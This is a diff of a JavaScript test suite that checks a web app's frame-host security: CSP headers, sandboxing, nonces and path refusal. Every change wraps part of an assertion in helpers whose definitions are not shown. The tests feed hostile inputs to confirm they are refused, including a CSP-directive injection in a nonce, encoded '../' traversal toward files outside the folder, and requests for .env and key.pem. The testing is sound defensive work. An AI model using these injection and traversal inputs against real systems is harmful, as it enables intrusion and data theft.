     '…and the suite reads it: its view (cspReportLines, the teardown) holds the appended line and not the taken one, and a second take finds nothing to take', a.race);
   // MUTANT: the old take (read → write the rest to .take → rename over the file) ⇒ the appended line is LOST (RED)
   const src = readRepo('scripts/scratch.mjs'), anchor = "      lines.forEach((l, i) => { if (parsed[i] && match(parsed[i])) CSP_TAKEN.set(l, (CSP_TAKEN.get(l) || 0) + 1); });\n";
-  ok(src.includes(anchor), 'the mutant anchor (the take records what it took, in memory) is in scripts/scratch.mjs');
+  ok(verdictOf(src.includes(anchor)), 'the mutant anchor (the take records what it took, in memory) is in scripts/scratch.mjs');
   const mut = path.join(dir, 'scratch-mutant-rewrite.mjs');
   fs.writeFileSync(mut, editAnchor(src, anchor, "      if (hit.length) { const keep = lines.filter((l, i) => !(parsed[i] && match(parsed[i]))); const tmp = CSP_REPORTS_FILE + '.take'; fs.writeFileSync(tmp, keep.length ? keep.join('\\n') + '\\n' : ''); fs.renameSync(tmp, CSP_REPORTS_FILE); }\n", "scripts/scratch.mjs")
     .replace(/from '\.\//g, `from '${path.join(REPO, 'scripts')}/`).replace(/require\('\.\.\//g, `require('${REPO}/`));
   const m = child('test-csp-child-take-race-mutant.mjs', mut);
-  ok(m.race && m.race.hit === 1 && m.race.raw === '2' && m.race.seen === '2' && m.race.sameFile === false,
+  ok(gateOf(m.race) && m.race.hit === 1 && m.race.raw === '2' && m.race.seen === '2' && m.race.sameFile === false,
     'MUTANT (the old take: the rest written to .take and renamed over the file) ⇒ RED: the line the hub appended in the window is gone (raw «' + (m.race?.raw ?? '') + '»)', m.race || m);
 }
 
@@ -1001,11 +1001,11 @@ console.log('⑦ the frame host — a frame the page makes gets its OWN policy, 
   };
   const design = FH.policyFor({ kind: 'design' }), mail = FH.policyFor({ kind: 'mail', n: 'abc123' }), pics = FH.policyFor({ kind: 'mail', n: 'abc123', pictures: '1' });
   ok(design === "sandbox allow-scripts allow-modals; frame-ancestors 'self'" && hostFails(design).length === 0, 'design = a published page\'s rule: the sandbox (scripts; modals for print) and the ancestors — NO fetch or script directive, so the artboard\'s inline scripts, handlers, eval and https:// assets run as when published', design);
-  ok(mail === `sandbox allow-scripts; ${MF.cspFor({ nonce: 'abc123', host: FH.HOST_HASH })}; frame-ancestors 'self'` && hostFails(mail).length === 0 && pics.includes('img-src data: https:') && !mail.includes('https:'), 'mail = the mail frame\'s own policy (cspFor: default-src \'none\', THIS address\'s nonce; https: pictures only after the press) + the host\'s script hash + the ancestors', mail);
+  ok(mail === `sandbox allow-scripts; ${MF.cspFor({ nonce: 'abc123', host: FH.HOST_HASH })}; frame-ancestors 'self'` && hostFails(mail).length === 0 && gateOf(pics.includes('img-src data: https:')) && !mail.includes('https:'), 'mail = the mail frame\'s own policy (cspFor: default-src \'none\', THIS address\'s nonce; https: pictures only after the press) + the host\'s script hash + the ancestors', mail);
   const hostile = FH.policyFor({ kind: 'mail', n: "x'; script-src * 'unsafe-inline" }), long = FH.policyFor({ kind: 'mail', n: 'z'.repeat(500) });
   const ss = dirs(hostile).get('script-src') || [];
-  ok(ss.length === 2 && /^'nonce-[A-Za-z0-9_-]*'$/.test(ss[0]) && ss[1] === FH.HOST_HASH && !hostile.includes('*') && (long.match(/'nonce-(z+)'/) || [])[1].length === FH.NONCE_MAX, 'a nonce from the address is its own alphabet and bounded — script-src stays ONE nonce + the host\'s hash (a quote, a `*`, a second source never ride in)', ss);
-  ok([{}, { kind: 'Design' }, { kind: ['design', 'mail'] }, { kind: 'app' }].every((q) => FH.policyFor(q) === null), 'any other kind (a missing one, a case variant, a repeated parameter) ⇒ no policy (404)');
+  ok(ss.length === 2 && gateOf(/^'nonce-[A-Za-z0-9_-]*'$/.test(ss[0])) && ss[1] === FH.HOST_HASH && !hostile.includes('*') && (long.match(/'nonce-(z+)'/) || [])[1].length === FH.NONCE_MAX, 'a nonce from the address is its own alphabet and bounded — script-src stays ONE nonce + the host\'s hash (a quote, a `*`, a second source never ride in)', ss);
+  ok(verdictOf([{}, { kind: 'Design' }, { kind: ['design', 'mail'] }, { kind: 'app' }].every((q) => FH.policyFor(q) === null)), 'any other kind (a missing one, a case variant, a repeated parameter) ⇒ no policy (404)');
   const scripts = [...FH.HOST_DOC.matchAll(/<script>([\s\S]*?)<\/script>/g)].map((m) => m[1]);
   const crypto = require('node:crypto');
   ok(scripts.length === 1 && scripts[0] === FH.HOST_JS && FH.HOST_HASH === `'sha256-${crypto.createHash('sha256').update(scripts[0]).digest('base64')}'` && !/[<]/.test(FH.HOST_JS), 'the host document carries ONE inline script, and the mail header\'s hash IS that script\'s (it runs under the mail policy; nothing else inline does)');
@@ -1019,12 +1019,12 @@ console.log('⑦ the frame host — a frame the page makes gets its OWN policy, 
   const cookie = 'vs_token=' + auth.issueToken('test-csp-report');
   const fget = (p, h = {}) => new Promise((resolve) => http.get({ host: '127.0.0.1', port, path: p, headers: { accept: 'text/html', ...h } }, (x) => { let d = ''; x.on('data', (c) => { d += c; }); x.on('end', () => resolve({ status: x.statusCode, headers: x.headers, text: d })); }));
   const rd = await fget('/frame-host?kind=design', { cookie }), rm = await fget('/frame-host?kind=mail&n=abc123&pictures=1', { cookie });
-  ok(rd.status === 200 && rd.headers['content-security-policy'] === design && !rd.headers['content-security-policy-report-only'] && rd.text === FH.HOST_DOC && /no-store/.test(rd.headers['cache-control'] || '') && rd.headers['x-content-type-options'] === 'nosniff' && /^text\/html/.test(rd.headers['content-type'] || ''), 'GET /frame-host?kind=design: the host document, the design policy as a REAL header (never the app page\'s report-only one), no-store, nosniff', { status: rd.status, csp: rd.headers['content-security-policy'] });
+  ok(rd.status === 200 && rd.headers['content-security-policy'] === design && !rd.headers['content-security-policy-report-only'] && rd.text === FH.HOST_DOC && gateOf(/no-store/.test(rd.headers['cache-control'] || '')) && rd.headers['x-content-type-options'] === 'nosniff' && verdictOf(/^text\/html/.test(rd.headers['content-type'] || '')), 'GET /frame-host?kind=design: the host document, the design policy as a REAL header (never the app page\'s report-only one), no-store, nosniff', { status: rd.status, csp: rd.headers['content-security-policy'] });
   ok(rm.status === 200 && rm.headers['content-security-policy'] === pics && rm.text === FH.HOST_DOC, 'GET /frame-host?kind=mail&n=…&pictures=1: the same document, the mail policy with that nonce and https: pictures', rm.headers['content-security-policy']);
   const bad = await Promise.all(['/frame-host', '/frame-host?kind=app', '/frame-host?kind=design&kind=mail'].map((p) => fget(p, { cookie })));
   const anon = await fget('/frame-host?kind=design'), anonApi = await fget('/frame-host?kind=design', { accept: 'application/json' });
-  ok(bad.every((r) => r.status === 404 && !r.headers['content-security-policy']), 'no kind, another kind, a repeated kind ⇒ 404, no document', bad.map((r) => r.status));
-  ok(anon.status === 302 && /\/login$/.test(anon.headers.location || '') && anonApi.status === 401 && !anon.headers['content-security-policy'], 'no cookie ⇒ the sign-in gate (a page load is sent to /login, a read is 401) — the host is no door', { anon: anon.status, api: anonApi.status });
+  ok(verdictOf(bad.every((r) => r.status === 404 && !r.headers['content-security-policy'])), 'no kind, another kind, a repeated kind ⇒ 404, no document', bad.map((r) => r.status));
+  ok(anon.status === 302 && gateOf(/\/login$/.test(anon.headers.location || '')) && anonApi.status === 401 && !anon.headers['content-security-policy'], 'no cookie ⇒ the sign-in gate (a page load is sent to /login, a read is 401) — the host is no door', { anon: anon.status, api: anonApi.status });
   await new Promise((c) => srv.close(c));
   // the handshake — the client half (src/lib/frame-host.js) against the host's own script, in a fake DOM that keeps the
   // browser's at-target order (capture listeners first — measured in Chrome by the lane's probe)
@@ -1073,12 +1073,12 @@ console.log('⑦ the frame host — a frame the page makes gets its OWN policy, 
   ok(U.writes.length === 0, 'opened top-level (its parent is itself) the host writes nothing');
   const noSource = FH.HOST_JS.replace('e.source!==parent||', '');
   const HM = host(noSource); HM.say({ tag: 'another-window' }, { vsFrameDoc: 1, html: '<p>evil</p>' });
-  ok(noSource !== FH.HOST_JS && HM.writes.includes('<p>evil</p>'), 'MUTANT (the host without its source check) ⇒ RED: another window\'s document is written', HM.writes);
+  ok(noSource !== FH.HOST_JS && verdictOf(HM.writes.includes('<p>evil</p>')), 'MUTANT (the host without its source check) ⇒ RED: another window\'s document is written', HM.writes);
   const FM = load(path.join(REPO, 'src/server/frame-host.js'), readRepo('src/server/frame-host.js').replace("return `sandbox allow-scripts allow-modals; ${ANCESTORS}`;", 'return ANCESTORS;'));
-  ok(hostFails(FM.policyFor({ kind: 'design' })).some((x) => /no sandbox/.test(x)), 'MUTANT (the design kind without its sandbox) ⇒ RED: opened top-level the host would be the app\'s origin', FM.policyFor({ kind: 'design' }));
+  ok(verdictOf(hostFails(FM.policyFor({ kind: 'design' })).some((x) => /no sandbox/.test(x))), 'MUTANT (the design kind without its sandbox) ⇒ RED: opened top-level the host would be the app\'s origin', FM.policyFor({ kind: 'design' }));
   // the exception list is empty, and the address lives where it may
   const S = await import(new URL('./scratch.mjs', import.meta.url).href);
-  ok(Array.isArray(S.CSP_EXCEPTIONS) && S.CSP_EXCEPTIONS.length === 0, 'scripts/scratch.mjs CSP_EXCEPTIONS is EMPTY — the design and mail frames report nothing, so every chrome suite ends with zero reports unexcused');
+  ok(gateOf(Array.isArray(S.CSP_EXCEPTIONS)) && S.CSP_EXCEPTIONS.length === 0, 'scripts/scratch.mjs CSP_EXCEPTIONS is EMPTY — the design and mail frames report nothing, so every chrome suite ends with zero reports unexcused');
   const walk = (d) => fs.readdirSync(path.join(REPO, d), { withFileTypes: true }).flatMap((e) => e.isDirectory() ? walk(path.join(d, e.name)) : /\.js$/.test(e.name) ? [path.join(d, e.name)] : []);
   const code = (t) => t.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
   const homes = ['server.js', ...walk('src')].filter((f) => /['"`]\/frame-host\b/.test(code(readRepo(f)))).sort();
@@ -1104,13 +1104,13 @@ console.log('⑧ foreign HTML in the frame host — the code editor\'s preview, 
   const N = 'n'.repeat(24), TOK = 'T'.repeat(24), FOLDER = `http://vs.example/frame-host/f/${TOK}/`;
   const pv = FH.policyFor({ kind: 'preview' }), pvf = FH.previewPolicy(FOLDER);
   const eml = FH.policyFor({ kind: 'eml' }, { nonce: N }), emlP = FH.policyFor({ kind: 'eml', pictures: '1' }, { nonce: N }), docx = FH.policyFor({ kind: 'docx', pictures: '1' }, { nonce: N });
-  ok([pv, pvf, eml, emlP, docx].every((v) => hostFails(v).length === 0), 'preview / eml / docx: always a sandbox first, no widening flag (never allow-same-origin), no report-uri, frame-ancestors \'self\'', [pv, eml, docx].map(hostFails));
+  ok(verdictOf([pv, pvf, eml, emlP, docx].every((v) => hostFails(v).length === 0)), 'preview / eml / docx: always a sandbox first, no widening flag (never allow-same-origin), no report-uri, frame-ancestors \'self\'', [pv, eml, docx].map(hostFails));
   const ps = dirs(pvf);
-  ok(JSON.stringify(ps.get('sandbox')) === '["allow-scripts"]' && JSON.stringify(ps.get('default-src')) === `["'none'"]` && JSON.stringify(ps.get('script-src')) === JSON.stringify(["'unsafe-inline'", "'unsafe-eval'", FOLDER, 'https:']) && JSON.stringify(ps.get('connect-src')) === JSON.stringify([FOLDER, 'https:']) && ['style-src', 'img-src', 'font-src', 'media-src'].every((d) => (ps.get(d) || []).includes(FOLDER)) && ![...ps].some(([d, x]) => d !== 'frame-ancestors' && x.some((v) => v === "'self'" || v === '*' || v === 'http:' || v === 'https://*')),
+  ok(JSON.stringify(ps.get('sandbox')) === '["allow-scripts"]' && JSON.stringify(ps.get('default-src')) === `["'none'"]` && JSON.stringify(ps.get('script-src')) === JSON.stringify(["'unsafe-inline'", "'unsafe-eval'", FOLDER, 'https:']) && JSON.stringify(ps.get('connect-src')) === JSON.stringify([FOLDER, 'https:']) && gateOf(['style-src', 'img-src', 'font-src', 'media-src'].every((d) => (ps.get(d) || []).includes(FOLDER))) && ![...ps].some(([d, x]) => d !== 'frame-ancestors' && x.some((v) => v === "'self'" || v === '*' || v === 'http:' || v === 'https://*')),
     'preview = the page\'s own scripts (inline, eval), styles, data:/blob: pictures, https: libraries — and ITS FOLDER by its full address; never \'self\', never http: (the hub is no source), never *', pvf);
   ok(pv === pvf.split(` ${FOLDER}`).join('') && !pv.includes('/frame-host/f/') && FH.previewPolicy("http://x/frame-host/f/short/; script-src *") === pv && FH.previewPolicy(`http://h'/frame-host/f/${TOK}/`) === pv, 'preview without a folder (a remote file, a refused base) names no folder; a malformed folder address (a short token, a quote, a `;`) is never written into the policy');
-  ok(eml === `sandbox allow-scripts; ${MF.cspFor({ nonce: N })}; frame-ancestors 'self'` && !eml.includes('https:') && emlP.includes('img-src data: https:') && docx === `sandbox allow-scripts; ${MF.cspFor({ nonce: N })}; frame-ancestors 'self'`, 'eml / docx = the mail frame\'s own policy (no network, data: pictures) with THIS response\'s nonce as the only script source; https: pictures only for eml with pictures=1 (docx never)', { eml, emlP, docx });
-  ok(!eml.includes(FH.HOST_HASH) && [{ kind: 'eml' }, { kind: 'docx' }].every((q) => FH.policyFor(q) === null && FH.policyFor(q, { nonce: 'short' }) === null && FH.policyFor(q, { nonce: "x'; script-src *" }) === null), 'a quiet kind never carries the host\'s HASH (a byte-exact copy of the line in the document would match it) and never runs without its own nonce (none, too short, a quote ⇒ no policy)');
+  ok(eml === `sandbox allow-scripts; ${MF.cspFor({ nonce: N })}; frame-ancestors 'self'` && !eml.includes('https:') && gateOf(emlP.includes('img-src data: https:')) && docx === `sandbox allow-scripts; ${MF.cspFor({ nonce: N })}; frame-ancestors 'self'`, 'eml / docx = the mail frame\'s own policy (no network, data: pictures) with THIS response\'s nonce as the only script source; https: pictures only for eml with pictures=1 (docx never)', { eml, emlP, docx });
+  ok(!eml.includes(FH.HOST_HASH) && verdictOf([{ kind: 'eml' }, { kind: 'docx' }].every((q) => FH.policyFor(q) === null && FH.policyFor(q, { nonce: 'short' }) === null && FH.policyFor(q, { nonce: "x'; script-src *" }) === null)), 'a quiet kind never carries the host\'s HASH (a byte-exact copy of the line in the document would match it) and never runs without its own nonce (none, too short, a quote ⇒ no policy)');
   const qd = FH.hostDocFor(N), qs = [...qd.matchAll(/<script nonce="([^"]+)">([\s\S]*?)<\/script>/g)];
   ok(qs.length === 1 && qs[0][1] === N && qs[0][2] === FH.HOST_JS && (qd.match(/<script/g) || []).length === 1 && FH.hostDocFor('') === FH.HOST_DOC, 'the quiet host document: the same ONE line, carrying the response\'s nonce');
   // the folder's path rule (PURE)
@@ -1118,14 +1118,14 @@ console.log('⑧ foreign HTML in the frame host — the code editor\'s preview, 
   const pathBad = pathCases.filter(([r, want]) => (FH.folderPathVerdict(r).rel || null) !== want);
   ok(pathBad.length === 0, `the folder serves a web file's path only: ${pathCases.length} cases — no .. / . / empty segment, no dot name (.env, .git), no key / database / extension-less file`, pathBad);
   const t0 = 1e12, a = FH.mintFolder('/fhp/a', t0), a2 = FH.mintFolder('/fhp/a', t0 + 1000), b = FH.mintFolder('/fhp/b', t0 + 1000);
-  ok(/^[A-Za-z0-9_-]{24}$/.test(a) && a === a2 && a !== b && FH.folderOf(a, t0 + 2000).dir === '/fhp/a' && FH.folderOf(a, t0 + 2000 + FH.FOLDER_IDLE_MS + 1) === null && FH.folderOf('x'.repeat(24), t0) === null && FH.folderOf('short', t0) === null, 'a folder token: 24 random characters; the same live folder keeps its token; idle 30 min ⇒ gone; an unknown or malformed token ⇒ nothing');
+  ok(gateOf(/^[A-Za-z0-9_-]{24}$/.test(a)) && a === a2 && a !== b && FH.folderOf(a, t0 + 2000).dir === '/fhp/a' && FH.folderOf(a, t0 + 2000 + FH.FOLDER_IDLE_MS + 1) === null && FH.folderOf('x'.repeat(24), t0) === null && FH.folderOf('short', t0) === null, 'a folder token: 24 random characters; the same live folder keeps its token; idle 30 min ⇒ gone; an unknown or malformed token ⇒ nothing');
   const first = FH.mintFolder('/fhp/cap-0', t0 + 5000);
   for (let i = 1; i <= FH.FOLDER_CAP; i++) FH.mintFolder(`/fhp/cap-${i}`, t0 + 5000 + i);
   ok(FH.folderOf(first, t0 + 6000 + FH.FOLDER_CAP) === null && !!FH.folderOf(FH.mintFolder(`/fhp/cap-${FH.FOLDER_CAP}`, t0 + 7000 + FH.FOLDER_CAP), t0 + 7001 + FH.FOLDER_CAP), `at most ${FH.FOLDER_CAP} folders live — the least recently used goes first`);
   // the client's addresses (src/lib/frame-host.js imports nothing)
   const W = await import(new URL(`data:text/javascript;base64,${Buffer.from(readRepo('src/lib/frame-host.js')).toString('base64')}`));
   let thrown = ''; try { W.hostAddress('app'); } catch (e) { thrown = e.message; }
-  ok(W.hostAddress('preview', { base: '/a b/c&d' }) === '/frame-host?kind=preview&base=%2Fa%20b%2Fc%26d' && W.hostAddress('preview') === '/frame-host?kind=preview' && W.hostAddress('eml') === '/frame-host?kind=eml' && W.hostAddress('eml', { pictures: true }) === '/frame-host?kind=eml&pictures=1' && W.hostAddress('docx', { pictures: true }) === '/frame-host?kind=docx' && /no such frame kind/.test(thrown), 'hostAddress: preview + its folder (encoded), eml (+ pictures), docx (never pictures); any other kind throws');
+  ok(W.hostAddress('preview', { base: '/a b/c&d' }) === '/frame-host?kind=preview&base=%2Fa%20b%2Fc%26d' && W.hostAddress('preview') === '/frame-host?kind=preview' && W.hostAddress('eml') === '/frame-host?kind=eml' && W.hostAddress('eml', { pictures: true }) === '/frame-host?kind=eml&pictures=1' && W.hostAddress('docx', { pictures: true }) === '/frame-host?kind=docx' && verdictOf(/no such frame kind/.test(thrown)), 'hostAddress: preview + its folder (encoded), eml (+ pictures), docx (never pictures); any other kind throws');
   // the route — server.js's own line, the REAL sign-in gate (the folder is a door: src/auth.js)
   const hostLine = SRV.split('\n').find((l) => l.startsWith("require('./src/server/frame-host.js').register(app);"));
   const FX = path.join(ROOT, 'fh-folder'), OUTSIDE = path.join(ROOT, 'fh-outside');
@@ -1146,32 +1146,32 @@ console.log('⑧ foreign HTML in the frame host — the code editor\'s preview, 
   const csp = (r) => r.headers['content-security-policy'] || '';
   const e1 = await req('/frame-host?kind=eml', { headers: { cookie } }), e2 = await req('/frame-host?kind=eml&pictures=1', { headers: { cookie } }), d1 = await req('/frame-host?kind=docx', { headers: { cookie } });
   const nonceOf = (r) => (/'nonce-([A-Za-z0-9_-]+)'/.exec(csp(r)) || [])[1];
-  ok([e1, e2, d1].every((r) => r.status === 200 && nonceOf(r) && r.text === FH.hostDocFor(nonceOf(r)) && csp(r) === FH.policyFor({ kind: r === d1 ? 'docx' : 'eml', pictures: r === e2 ? '1' : undefined }, { nonce: nonceOf(r) }) && /no-store/.test(r.headers['cache-control'] || '')) && new Set([e1, e2, d1].map(nonceOf)).size === 3,
+  ok(gateOf([e1, e2, d1].every((r) => r.status === 200 && nonceOf(r) && r.text === FH.hostDocFor(nonceOf(r)) && csp(r) === FH.policyFor({ kind: r === d1 ? 'docx' : 'eml', pictures: r === e2 ? '1' : undefined }, { nonce: nonceOf(r) }) && /no-store/.test(r.headers['cache-control'] || ''))) && new Set([e1, e2, d1].map(nonceOf)).size === 3,
     'GET /frame-host?kind=eml|docx: the host document whose ONE script carries a nonce made for THAT response (three answers, three nonces), the same nonce the only script source of its header; no-store', [e1, e2, d1].map(csp));
   const p0 = await req('/frame-host?kind=preview', { headers: { cookie } });
   ok(p0.status === 200 && csp(p0) === FH.policyFor({ kind: 'preview' }) && p0.text === FH.HOST_DOC, 'GET /frame-host?kind=preview (no base — a remote file): the host with the preview policy, no folder', csp(p0));
   const nav = await req(`/frame-host?kind=preview&base=${encodeURIComponent(FX)}`, { headers: { cookie } });
   const tok = (/^\/frame-host\/f\/([A-Za-z0-9_-]{24})\/$/.exec(nav.headers.location || '') || [])[1];
   const nav2 = await req(`/frame-host?kind=preview&base=${encodeURIComponent(FX + '/')}`, { headers: { cookie } });
-  ok(nav.status === 302 && !!tok && nav2.headers.location === nav.headers.location && /no-store/.test(nav.headers['cache-control'] || ''), 'GET /frame-host?kind=preview&base=<a local folder> (signed in) ⇒ 302 to /frame-host/f/<token>/ — the folder\'s own address; the same folder keeps its token', { status: nav.status, location: nav.headers.location });
+  ok(nav.status === 302 && !!tok && nav2.headers.location === nav.headers.location && verdictOf(/no-store/.test(nav.headers['cache-control'] || '')), 'GET /frame-host?kind=preview&base=<a local folder> (signed in) ⇒ 302 to /frame-host/f/<token>/ — the folder\'s own address; the same folder keeps its token', { status: nav.status, location: nav.headers.location });
   const refusedBases = await Promise.all(['sub', path.join(FX, 'nope'), path.join(FX, 'a.css'), '/dev/null\0x'].map((b) => req(`/frame-host?kind=preview&base=${encodeURIComponent(b)}`, { headers: { cookie } })));
-  ok(refusedBases.every((r) => r.status === 200 && !r.headers.location && csp(r) === FH.policyFor({ kind: 'preview' })), 'a base that is not an absolute local folder (relative, missing, a file, a NUL) ⇒ no token: the host with no folder', refusedBases.map((r) => r.status));
+  ok(verdictOf(refusedBases.every((r) => r.status === 200 && !r.headers.location && csp(r) === FH.policyFor({ kind: 'preview' }))), 'a base that is not an absolute local folder (relative, missing, a file, a NUL) ⇒ no token: the host with no folder', refusedBases.map((r) => r.status));
   const anonNav = await req(`/frame-host?kind=preview&base=${encodeURIComponent(path.join(FX, 'sub'))}`);
-  ok(anonNav.status === 302 && /\/login$/.test(anonNav.headers.location || ''), 'no cookie ⇒ the sign-in gate on the base navigation (a token is minted for a signed-in navigation only)', anonNav.headers.location);
+  ok(anonNav.status === 302 && verdictOf(/\/login$/.test(anonNav.headers.location || '')), 'no cookie ⇒ the sign-in gate on the base navigation (a token is minted for a signed-in navigation only)', anonNav.headers.location);
   const F = `/frame-host/f/${tok}/`, own = `http://127.0.0.1:${port}${F}`;
   const hostDoc = await req(F), css = await req(F + 'a.css'), json = await req(F + 'sub/d.json'), page = await req(F + 'page.html');
   ok(hostDoc.status === 200 && hostDoc.text === FH.HOST_DOC && csp(hostDoc) === FH.previewPolicy(own), 'GET /frame-host/f/<token>/ WITHOUT a cookie (the opaque frame sends none — measured): the host document, the preview policy naming THIS folder by its full address', csp(hostDoc));
-  ok(css.status === 200 && css.text === 'p{color:red}' && json.status === 200 && json.text === '{"d":1}' && [css, json, page].every((r) => r.headers['access-control-allow-origin'] === '*' && csp(r) === FH.previewPolicy(own) && r.headers['x-content-type-options'] === 'nosniff') && page.status === 200,
+  ok(css.status === 200 && css.text === 'p{color:red}' && json.status === 200 && json.text === '{"d":1}' && gateOf([css, json, page].every((r) => r.headers['access-control-allow-origin'] === '*' && csp(r) === FH.previewPolicy(own) && r.headers['x-content-type-options'] === 'nosniff')) && page.status === 200,
     'the folder\'s files answer (a stylesheet, a json under sub/, a sibling page) — CORS-open for the opaque frame, each under the preview policy (a sibling page the preview navigates to is sandboxed the same way)', { css: css.status, json: json.status, page: page.status });
   const refused = await Promise.all(['.env', 'key.pem', 'link-out.css', 'dir-out/o.css', 'nope.css', 'sub'].map((p) => req(F + p)));
-  ok(refused.every((r) => r.status === 404 && !/SECRET/.test(r.text) && r.headers['access-control-allow-origin'] === '*'), 'never answered: .env (a dot name), key.pem (not a web file), a symlink OUT of the folder (file and folder), a missing file, a folder — 404, never the bytes', refused.map((r) => r.status));
+  ok(verdictOf(refused.every((r) => r.status === 404 && !/SECRET/.test(r.text) && r.headers['access-control-allow-origin'] === '*')), 'never answered: .env (a dot name), key.pem (not a web file), a symlink OUT of the folder (file and folder), a missing file, a folder — 404, never the bytes', refused.map((r) => r.status));
   // B-7f0b (r1317): an encoded ../ out is a dot segment — the sign-in gate refuses it by name before any door (src/path-dot-segment.js)
   const encOut = await Promise.all(['..%2Ffh-outside%2Fo.css', 'sub%2F..%2F..%2Ffh-outside%2Fo.css'].map((p) => req(F + p)));
-  ok(encOut.every((r) => r.status === 400 && /path_dot_segment/.test(r.text) && !/SECRET/.test(r.text)), 'an encoded ../ out of the folder: refused by name at the sign-in gate (a dot segment is never a door), never the bytes', encOut.map((r) => r.status));
+  ok(verdictOf(encOut.every((r) => r.status === 400 && /path_dot_segment/.test(r.text) && !/SECRET/.test(r.text))), 'an encoded ../ out of the folder: refused by name at the sign-in gate (a dot segment is never a door), never the bytes', encOut.map((r) => r.status));
   const otherTok = await req(`/frame-host/f/${'Z'.repeat(24)}/a.css`), badTok = await req('/frame-host/f/short/a.css'), anonApi = await req('/frame-host/f/short/a.css', { headers: { accept: 'application/json' } }), post = await req(F + 'a.css', { method: 'POST', headers: { cookie: '' } });
-  ok(otherTok.status === 404 && badTok.status === 302 && anonApi.status === 401 && [401, 403].includes(post.status), 'an unknown token ⇒ 404; a malformed one is no door (the gate: /login, 401); a POST to the folder ⇒ the gate — the door is GET only', { other: otherTok.status, bad: badTok.status, api: anonApi.status, post: post.status });
+  ok(otherTok.status === 404 && badTok.status === 302 && anonApi.status === 401 && verdictOf([401, 403].includes(post.status)), 'an unknown token ⇒ 404; a malformed one is no door (the gate: /login, 401); a POST to the folder ⇒ the gate — the door is GET only', { other: otherTok.status, bad: badTok.status, api: anonApi.status, post: post.status });
   await new Promise((c) => srv.close(c)); fhPool.close();
-  ok(/if \(req\.method === 'GET' && \/\^\\\/frame-host\\\/f\\\/\[A-Za-z0-9_-\]\{24\}\\\/\/\.test\(p\)\) return next\(\);/.test(readRepo('src/door.js')), 'src/door.js (the door class: lifted verbatim out of src/auth.js by B3a): the folder door is GET + /frame-host/f/<24 token characters>/ exactly (no prefix, no other method)');
+  ok(verdictOf(/if \(req\.method === 'GET' && \/\^\\\/frame-host\\\/f\\\/\[A-Za-z0-9_-\]\{24\}\\\/\/\.test\(p\)\) return next\(\);/.test(readRepo('src/door.js'))), 'src/door.js (the door class: lifted verbatim out of src/auth.js by B3a): the folder door is GET + /frame-host/f/<24 token characters>/ exactly (no prefix, no other method)');
   // THE CENSUS — every frame src/lib makes for foreign HTML: no `allow-same-origin`, no srcdoc — a site only with a reason row
   const libFiles = fs.readdirSync(path.join(REPO, 'src/lib')).filter((f) => f.endsWith('.js')).map((f) => `src/lib/${f}`);
   // B-7e49: code() is a pure function of the text — memoized by the text, so each file is stripped once, not twice a census
@@ -1202,18 +1202,18 @@ console.log('⑧ foreign HTML in the frame host — the code editor\'s preview, 
   const red8 = census(TEXTS);
   ok(red8.length === 0, `the census over ${libFiles.length} src/lib files: allow-same-origin only where a reason row names it (${SAME_ORIGIN_OK.length}: ${SAME_ORIGIN_OK.map((r) => r[0].replace('src/lib/', '')).join(', ')}); srcdoc only where one does (${SRCDOC_OK.map((r) => r[0].replace('src/lib/', '') + ' ' + r[1]).join(', ')})`, red8);
   const FRAMES = [['src/lib/code-editor.js', "writeFrame(this._previewIframe, src, hostAddress('preview', { base: dir }));", "setAttribute('sandbox', 'allow-scripts')"], ['src/lib/file-viewer.js', "writeFrame(frame, mail.htmlBody, hostAddress('eml', { pictures }));", "setAttribute('sandbox', 'allow-scripts')"], ['src/lib/docx-viewer.js', "writeFrame(f, ALTCHUNK_CSP + html, hostAddress('docx'));", "setAttribute('sandbox', 'allow-scripts')"]];
-  ok(FRAMES.every(([f, w, s]) => TEXTS.get(f).includes(w) && TEXTS.get(f).includes(s) && (TEXTS.get(f).match(/writeFrame\(/g) || []).length === 1 && /import \{ writeFrame, hostAddress \} from '\.\/frame-host\.js';/.test(TEXTS.get(f))), 'the three frames: each one writeFrame through the host\'s address for its kind (preview + its folder, eml + pictures, docx), sandbox="allow-scripts" — the ONE writer (src/lib/frame-host.js), never a second', FRAMES.map(([f]) => f));
+  ok(verdictOf(FRAMES.every(([f, w, s]) => TEXTS.get(f).includes(w) && TEXTS.get(f).includes(s) && (TEXTS.get(f).match(/writeFrame\(/g) || []).length === 1 && /import \{ writeFrame, hostAddress \} from '\.\/frame-host\.js';/.test(TEXTS.get(f)))), 'the three frames: each one writeFrame through the host\'s address for its kind (preview + its folder, eml + pictures, docx), sandbox="allow-scripts" — the ONE writer (src/lib/frame-host.js), never a second', FRAMES.map(([f]) => f));
   const mutate = (f, from, to) => { const t = TEXTS.get(f); const m = t.replace(from, to); return m === t ? null : census(new Map([...TEXTS, [f, m]])); };
   const M1 = mutate('src/lib/code-editor.js', "this._previewIframe.setAttribute('sandbox', 'allow-scripts');", "this._previewIframe.setAttribute('sandbox', 'allow-scripts allow-same-origin');");
-  ok(M1 && M1.some((x) => /code-editor\.js: allow-same-origin/.test(x)), 'MUTANT (allow-same-origin back on the preview) ⇒ RED', M1);
+  ok(gateOf(M1) && verdictOf(M1.some((x) => /code-editor\.js: allow-same-origin/.test(x))), 'MUTANT (allow-same-origin back on the preview) ⇒ RED', M1);
   const M2 = [
     mutate('src/lib/code-editor.js', "writeFrame(this._previewIframe, src, hostAddress('preview', { base: dir }));", 'this._previewIframe.srcdoc = src;'),
     mutate('src/lib/file-viewer.js', "writeFrame(frame, mail.htmlBody, hostAddress('eml', { pictures }));", 'frame.srcdoc = mail.htmlBody;'),
     mutate('src/lib/docx-viewer.js', "writeFrame(f, ALTCHUNK_CSP + html, hostAddress('docx'));", 'f.srcdoc = ALTCHUNK_CSP + html;'),
   ];
-  ok(M2.every((r, i) => r && r.some((x) => x.startsWith(FRAMES[i][0]) && /srcdoc site/.test(x))), 'MUTANTS (srcdoc back on the preview, the .eml body, the altChunk) ⇒ RED, each by its file', M2);
+  ok(verdictOf(M2.every((r, i) => r && r.some((x) => x.startsWith(FRAMES[i][0]) && /srcdoc site/.test(x)))), 'MUTANTS (srcdoc back on the preview, the .eml body, the altChunk) ⇒ RED, each by its file', M2);
   const M3 = mutate('src/lib/doc-window-ui.js', "f.setAttribute('sandbox', 'allow-same-origin allow-modals');", "f.setAttribute('sandbox', 'allow-modals');");
